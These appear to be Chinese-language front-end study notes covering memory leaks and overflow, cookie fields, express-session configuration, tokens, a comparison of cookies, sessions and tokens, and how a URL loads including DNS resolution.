### 概念

内存泄漏指的是程序中已分配的内存，在不再需要时没有被正确释放回操作系统或可用内存池。这通常是因为==程序中存在对不再使用的内存的引用==，导致垃圾回收器无法回收这部分内存。随着程序的运行，未被回收的内存会逐渐累积，最终可能会耗尽程序可用的内存资源，影响程序性能，甚至导致程序崩溃。

### 原因

- 全局变量过多，未被垃圾回收机制清除。
- 闭包使用不当，导致局部变量未被释放。
- DOM引用未清除，如被删除的DOM元素仍被JavaScript对象引用。
- 未清理的定时器和回调函数。

### 表现

页面性能逐渐下降，响应变慢，甚至出现页面冻结。

### 查看方式

可以通过Chrome DevTools的Performance和Memory面板来监控和诊断内存问题。

### 解决方案

避免全局变量的滥用，合理使用闭包，及时清理定时器和事件监听器，避免对已删除DOM的引用等

## 内存溢出

内存溢出则是指程序尝试使用超过最大可用内存的内存量。当程序请求的内存超过了系统能够提供的内存限额时，就会发生内存溢出。这通常会导致程序异常终止。

### 原因

内存泄漏积累导致可用内存耗尽。程序一次性申请了过多的内存，如大量循环或递归调用。

### 表现

浏览器卡顿，页面无响应，最终可能导致浏览器崩溃。

### 解决方案

- 优化程序算法和数据结构，减少内存使用。
- 对程序进行压力测试，确保在高负载下也不会超出内存限制。
- 在程序设计时考虑内存限制，避免分配过大的内存块。

# 会话控制

## Cookie

### 概念

Cookie 是一种服务端保存在浏览器端的数据片段，以 key/value 的形式进行保存。每次请求的时候，请求头会自动包含本网站此目录下的 Cookie 数据。网站经常使用这个技术来识别用户是否登录等功能。

**注：**浏览器发送请求的时候，会自动携带相同域名下的cookie

### 特点

- Cookie 是由服务端通过 Set-Cookie 响应头发送给浏览器的，浏览器收到后会保存在本地。
- Cookie 有一定的大小限制，一般不超过 4KB，不同的浏览器可能有不同的限制。
- Cookie 有一个域名和路径的作用范围，只有在相同的域名和路径下，浏览器才会发送 Cookie 给服务端。
- Cookie 可以设置一个过期时间，如果没有设置，则默认为浏览器关闭时过期。
- Cookie 可以设置一些属性，如 HttpOnly（防止被 JavaScript 访问），Secure（只能通过 HTTPS 传输），SameSite（防止跨站请求伪造）等。

Cookie 是一种实现状态管理的技术，它可以让无状态的 HTTP 协议记住用户的信息和偏好。但是 Cookie 也有一些缺点，如占用带宽，降低性能，存在安全风险等。因此，在使用 Cookie 时要注意合理地设置其大小，作用范围，过期时间和属性。

### cookie字段

关于 cookie 的字段，你可以在后端设置以下几种：
- **name** 和 **value**：这是 cookie 的基本组成部分，表示 cookie 的名称和值。例如，`Set-Cookie: yummy_cookie=choco`¹。

- **Expires** 和 **Max-Age**：这两个字段用于定义 cookie 的生命周期，即 cookie 何时会被删除。**Expires** 指定了一个具体的日期，而 **Max-Age** 指定了一个时间段。例如，`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`。

- **Secure** 和 **HttpOnly**：这两个字段用于限制 cookie 的访问权限，以提高 cookie 的安全性。**Secure** 表示 cookie 只能通过 HTTPS 协议发送，而 **HttpOnly** 表示 cookie 不能被 JavaScript 访问。例如，`Set-Cookie: id=a3fWa; Secure; HttpOnly`。

- **Domain** 和 **Path**：这两个字段用于定义 cookie 的作用域，即哪些主机和路径可以接收 cookie。

  这里的“允许访问”指的是，访问指定的域或者路径才会携带该cookie

  - **Domain** 指定了允许访问 cookie 的域名，如果不指定，默认为同一 host 设置 cookie 的域名。
  - **Path** 指定了允许访问 cookie 的 URL 路径，如果不指定，默认为同一 host 设置 cookie 的路径。例如，`Set-Cookie: name=value; Domain=example.com; Path=/blog`。


以上是一些常用的 cookie 字段，你可以根据你的需求来设置它们。如果你想了解更多关于 cookie-parser 包的使用，你可以参考官方网站或其他相关的博客。

### 第三方cookie

当一个网站加载的时候，也会向其他的网站发送请求，会在该网站下保留其他网站的cookie，称为第三方cookie。用于跨站追踪用户行为

## Session

### 概念

session 是保存在服务器端的一块儿数据，保存当前访问用户的相关信息。

Session 是一种会话管理的技术，它可以让无状态的 HTTP 协议记住用户的信息和状态

### Session原理/流程

浏览器与服务器之间通信，这个过程称之为一次会话:session。

- 浏览器向服务器发送请求。
- 如果之前没通信过，服务器会记录当前用户的信息(有用信息)，并将信息存储到数据库中，并对应着一个id。
  - 服务器会将sessionId设置在响应头set-cookie中的方式响应给客户端；
  - session的过期时间是由cookie来设置的：max-age
- 浏览器会将sessionId记录在Cookie中。
- 浏览器再次通信，Cookie中包含着sessionId，那么服务器就可以通过id找到用户信息，进而进行操作。

### Session配置项

```js
// 设置中间件
app.use(session({
    name: 'sid',                //设置cookie的name，默认值是：connect.sid
    secret: 'atguigu',          //参与加密的字符串（又称签名）
    saveUninitialized: false,   //是否为每次请求都设置一个cookie用来存储session的id
    resave: true,               //是否在每次请求时重新保存session
    store: MongoStore.create({
        mongoUrl: 'mongodb://127.0.0.1:27017/bilibili' //数据库的连接配置
    }),
    cookie: {
        httpOnly: true, // 开启后前端无法通过 JS 操作
        maxAge: 1000 * 60 * 5 // 这一条 是控制 sessionID 的过期时间的！！！
    },
}))
```

- resave: 每次访问都会更新Session的生命周期
- maxAge：设置生命周期

**注意**

session只是保存、传输信息的工具，本身不具有校验功能，校验、查找等功能写在代码里。

**判断用户登陆状态**

- 如果存在sessionId，我们可以获取session中的信息，判断是谁登陆的。然后返回相应的数据
- 因此在访问相同域名的情况下，Cookie相同，sessionid是相同的，因此可以通过sessionid判断信息，让用户访问同域名的其他网页。

##### 3. 关于重新登陆？？

如果设置了：登陆就设置session：

- 如果Cookie中存在session，并且和数据库的相同，那么该sessionid不会修改。而是使用原来的session对象，进行增删改查。
- 如果退出登陆就销毁session，那么重新登陆意味着重新生成session对象

## Token

### 概念

Token是一种用于身份验证和授权的技术，它可以让客户端和服务端之间进行安全和高效的数据交互。

### 原理

- 用户登陆网站
- 服务器利用用户信息进行加密生成一个Token，返回数据时，将Token添加到响应头中
- 用户再次发送请求时，要“主动”携带Token来进行身份验证
- 服务器验证成功之后，再针对用户请求进行处理

### 特点

- 对数据进行加密，相较于cookie有较高的安全性
- 可以防止CSRF攻击

服务器->浏览器的加密字符换。

和cookie类似，不过请求头是token。token是手动发送（从浏览器到服务的时候是主动的），cookie是自动的。

### 相关面试题



#### Cookie、Session、Token对比

Cookie和session本质是类似的，只不过，cookie是记录的所有数据，而session设置的是一个id，最终由服务器存储。

## 对比

### Session 和 Cookie

#### 作用

- 主要是用于标识用户身份，存储少量信息

#### 存储位置

- cookie： 浏览器
- Session：服务端
- Token： 浏览器

#### 生命周期

- Session和cookie本身都可以自行设置生命周期，一般默认是关闭浏览器后会自动清楚。

- token可以手动设置生命周期
- 

#### 安全性

- cookie是明文存储和传输

- SessionId存储在cookie中，并且SessionId本身不存储信息，而信息存储在服务器的Session对象中。
- Token

#### 大小

- Session大小没有限制
- cookie： 4KB

#### 扩展性

- Token具有较强的拓展性

## 其他经典相关问题

### 从输入URL到页面展示

#### 从浏览器的角度

当你在浏览器中输入url后，会发生以下几个步骤【各部分都详细介绍】：

- **URL解析**：浏览器会判断你输入的是一个合法的url还是一个待搜索的关键词，并根据你输入的内容进行自动完成、字符编码等操作。浏览器还会进行一些安全检查、访问限制等操作，并检查缓存中是否有该url对应的资源。
- **DNS查询**：浏览器会根据url中的域名，通过一系列的递归和迭代查询，从浏览器缓存、系统缓存、路由器缓存、ISP DNS缓存和根域名服务器等不同层级的DNS服务器，获取该域名对应的IP地址。
- **TCP连接**：浏览器会根据IP地址和端口号，向服务器发起一个TCP连接请求，通过三次握手协议，建立一个可靠的双向通信信道。如果是HTTPS请求，还需要进行SSL握手，建立一个安全的加密通信信道。
- **HTTP请求**：浏览器会构造一个HTTP请求报文，包含请求方法、目标地址、协议版本、请求头和请求体等信息，并通过TCP连接发送给服务器。
- **HTTP响应**：服务器收到HTTP请求后，会进行一些处理，如验证、重定向、URL重写等，并根据请求的资源类型，调用相应的程序或脚本来生成响应内容。然后，服务器会构造一个HTTP响应报文，包含状态码、响应头和响应体等信息，并通过TCP连接发送给浏览器。
- **渲染页面**：浏览器收到HTTP响应后，会对响应报文进行解析，根据状态码做不同的处理，如重定向、缓存等。然后，浏览器会根据响应内容的MIME类型，进行不同的解析方式，如HTML、Image等。最后，浏览器会通过一系列的子阶段，如构建DOM树、样式计算、布局阶段、分层、栅格化和显示等，将响应内容渲染成可视化的页面。

#### 服务端的角度

### DNS解析过程

> [DNS域名解析过程_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1uL4y1B7aE/?vd_source=7ce3f834cb0c7108338f1996b4436d48)

DNS解析的过程是指将域名转换为IP地址的过程，以便用户可以通过域名访问互联网上的资源。DNS解析的过程大致如下：

- 用户在浏览器中输入一个域名，如www.baidu.com，浏览器会先检查自己的缓存中是否有这个域名对应的IP地址，如果有，就直接使用该IP地址访问网站。
- 如果浏览器缓存中没有，浏览器会再检查操作系统的缓存中是否有这个域名对应的IP地址，如果有，也会直接使用该IP地址访问网站。
- 如果操作系统缓存中也没有，浏览器会向本地DNS服务器（Local DNS）发送一个DNS查询请求，本地DNS服务器是用户所在网络运营商提供的一个DNS服务，它会在自己的缓存中查找这个域名对应的IP地址，如果找到，就返回给浏览器。
- 如果本地DNS服务器缓存中也没有，本地DNS服务器就会向根DNS服务器（Root DNS）发送一个DNS查询请求，根DNS服务器是全球最高级别的DNS服务器，它们负责管理所有顶级域名（如.com、.cn、.org等），根DNS服务器会根据请求的域名返回一个对应的顶级域名服务器（TLD Server）的地址给本地DNS服务器。
- 本地DNS服务器再向根DNS服务器返回的顶级域名服务器发送一个DNS查询请求，顶级域名服务器负责管理某个顶级域名下的所有二级域名（如baidu.com、taobao.com等），顶级域名服务器会根据请求的域名返回一个对应的权威域名服务器（Authoritative Server）的地址给本地DNS服务器。
- 本地DNS服务器再向顶级域名服务器返回的权威域名服务器发送一个DNS查询请求，权威域名服务器是由域名注册商提供的一个DNS服务，它负责管理某个二级域名下的所有子域名（如www.baidu.com、mail.baidu.com等），权威域名服务器会根据请求的域名返回一个对应的IP地址给本地DNS服务器。
- 本地DNS服务器将最终得到的IP地址返回给浏览器，并将其缓存一段时间以备后用。浏览器也会将这个IP地址缓存一段时间，并使用它来访问网站。

以上是我对DNS解析的过程的回答，希望对你有所帮助。如果你想了解更多相关信息，你可以参考以下网页：

- [细说DNS域名解析的原理和过程 - 帝恩思-DNS.COM](https://www.dns.com/supports/article/705.html)
- [简述DNS解析过程_简述dns解析的过程-CSDN博客](https://blog.csdn.net/borderhz/article/details/117301624)
- [wireshark dns域名解析抓包实验分析 - 不忘初心dbsdxq - 博客园](https://www.cnblogs.com/mggahui/p/13899888.html)

## 其他TIPS

1. Chrome有个机制，同一个域名同时最多只能建立6个TCP连接
